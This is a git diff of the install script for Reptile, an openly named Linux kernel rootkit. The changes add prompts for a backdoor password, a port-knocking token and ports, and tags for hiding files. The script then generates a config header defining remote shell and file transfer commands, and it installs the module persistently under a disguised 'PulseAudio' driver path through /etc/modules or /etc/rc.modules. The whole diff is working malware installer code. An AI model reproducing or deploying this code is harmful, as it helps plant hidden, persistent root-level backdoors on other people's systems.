@@ -3,10 +3,8 @@
 # Reptile Install Script
 # Author: F0rb1dd3n
 
-MODULE="reptile"
 DRIVER="PulseAudio"
 KERNEL_VERSION=$(uname -r)
-DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
 
 function banner {
@@ -19,9 +17,25 @@ function banner {
 function usage {
 	banner
 	echo -e "\nUsage: $0 <arg>\n"
-	echo -e "\tbuild\t\tCompile the module"
 	echo -e "\tinstall\t\tCompile and install the module persistently"
 	echo -e "\tremove\t\tRemove the persistence of module\n"
+}
+
+function load_config {
+	RETVAL=""
+
+	if [ -z $2 ]; then
+		ROTULE="$1: "
+	else
+		ROTULE="$1 (default: $2): "
+	fi
+
+	read -p "$ROTULE"
+	if [ -z $REPLY ]; then
+		RETVAL=$2
+	else
+		RETVAL=$REPLY
+	fi
 }
 
 function directory_remove {
@@ -79,10 +93,6 @@ function reptile_init {
         	exit
 	}
 
-	if [ ! -d $DRIVER_DIRECTORY ]; then
-        	mkdir -p $DRIVER_DIRECTORY
-    	fi
-
     	for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
        	do 
             	SYSTEM=${f:5:${#f}-13}
@@ -92,22 +102,86 @@ function reptile_init {
         	#TODO: error message
         	exit
     	fi
+	
+	echo
+	load_config "Hide name (will be used to hide dirs/files)" "reptile"
+	MODULE=$RETVAL
+	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
+
+	load_config "Auth token to port-knocking" "F0rb1dd3n"
+	TOKEN=$RETVAL
+	
+	load_config "Backdoor password" "hax0r"
+	PASS=$RETVAL
+	
+	load_config "Tag name that hide file contents" "reptile"
+	TAG=$RETVAL
+	
+	load_config "Source port to port-knocking" "666"
+	SRCPORT=$RETVAL
+	
+	load_config "TCP port to port-knocking" "80"
+	TCPPORT=$RETVAL
+	
+	load_config "UPD port to port-knocking" "53"
+	UDPPORT=$RETVAL
+
+	MAGIC_ID=$[ ( $RANDOM % ( $[ 99999999 - 1337 ] + 1 ) ) + 1337 ] 
+
+	echo -e "Hide name: \e[01;36m$MODULE\e[00m"
+	echo -e "Token: \e[01;36m$TOKEN\e[00m"
+	echo -e "Backdoor password: \e[01;36m$PASS\e[00m"
+	echo -e "SRC port: \e[01;36m$SRCPORT\e[00m"
+	echo -e "TCP port: \e[01;36m$TCPPORT\e[00m"
+	echo -e "UDP port: \e[01;36m$UDPPORT\e[00m"
+	echo -e "TAGs to hide file contents: \n\n\e[01;36m#<$TAG>\n\e[00mcontent to be hidden\n\e[01;36m#</$TAG>\e[00m\n"
 }
 
-function reptile_build {
-	echo -e "\n\e[00;31m############################### \e[01;36mBuilding...\e[00;31m ################################\e[00m\n"
-	make all
+function config_gen {
+	_SHELL="/"$MODULE"/"$MODULE"_shell"
+	START="/"$MODULE"/"$MODULE"_start.sh"
+	WORKQUEUE="/"$MODULE"_shell"
+	RCFILE="/"$MODULE"/"$MODULE"_rc"
 
-	echo -e "\n\e[00;31m############################### \e[01;36mCleanning...\e[00;31m ###############################\e[00m\n" 
-	make clean
+	cat > sbin/config.h <<EOF
+#ifndef _CONFIG_H
+#define _CONFIG_H
 
-	mv bin/rep_mod bin/$MODULE.ko
+#define MAGIC_ID	$MAGIC_ID
+#define TOKEN 		"$TOKEN"
+#define PASS 		"$PASS"
+#define SHELL 		"$_SHELL"
+#define START 		"$START"
+#define HIDE 		"$MODULE"
+#define HIDETAGIN 	"#<$TAG>"
+#define HIDETAGOUT 	"#</$TAG>"
+#define WORKQUEUE 	"$WORKQUEUE"
+#define SRCPORT 	$SRCPORT
+#define TCPPORT 	$TCPPORT
+#define UDPPORT 	$UDPPORT
+#define HOMEDIR 	"/$MODULE"
+#define RCFILE 		"$RCFILE"
+#define ERROR		-1
+#define GET_FILE	 1
+#define PUT_FILE	 2
+#define RUNSHELL	 3
+
+#endif
+EOF
 }
 
 function reptile_install {
 	reptile_init
+	
+	echo -ne "Configuring... "
+	if [ ! -d $DRIVER_DIRECTORY ]; then
+        	mkdir -p $DRIVER_DIRECTORY
+    	fi
 
-	echo -ne "\nCompiling... "
+	config_gen && \
+	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	
+	echo -ne "Compiling... "
 	make all > /dev/null 2>&1 && \
 	make clean > /dev/null 2>&1 && \
 	mv bin/rep_mod bin/$MODULE.ko > /dev/null 2>&1 && \
@@ -126,13 +200,9 @@ function reptile_install {
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
 		# we have to break these strings, cause when Reptile is loaded, this script may fail to remove
-        	echo -ne "#<rep" >> /etc/modules && \
-		echo -ne "tile>\nreptile\n#</rep" >> /etc/modules && \
-		echo -ne "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -ne "#<rep" >> /etc/rc.modules && \
-		echo -ne "tile>\nreptile\n#</rep" >> /etc/rc.modules && \
-		echo -ne "tile>" >> /etc/rc.modules && \
+        	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/rc.modules && \
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
         #	echo -ne "#<rep" >> /etc/modules && \
@@ -149,9 +219,14 @@ function reptile_install {
 
 function reptile_remove {
 	banner
+
+	echo	
+	load_config "Hide name" "reptile"
+	MODULE=$RETVAL
+	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 	
 	if [ ! -d "/$MODULE" ]; then
-	       echo -e "\nReptile seems to be uninstalled!\n"	
+	       echo -e "Reptile seems to be uninstalled!\n"	
 	       exit
 	fi
 
@@ -175,10 +250,6 @@ function reptile_remove {
 }
 
 case $1 in
-	build)
-		reptile_build
-		echo -e "\n\e[01;36mDONE!\e[00m\n"
-		;;
     	install)
         	reptile_install
         	;;
